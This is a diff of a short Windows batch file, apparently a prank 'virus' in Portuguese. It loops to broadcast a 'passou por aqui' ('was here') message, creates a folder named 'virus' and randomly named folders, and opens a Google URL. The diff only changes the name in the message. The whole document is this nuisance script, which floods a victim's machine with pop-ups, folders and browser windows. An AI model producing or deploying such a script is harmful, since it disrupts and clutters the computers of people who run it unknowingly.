@@ -1,6 +1,6 @@
 @echo off
 :loop
-msg * JuuJ passou por aqui.
+msg * ??? passou por aqui.
 md virus
 md %random%
 start https://www.google.com/juuj
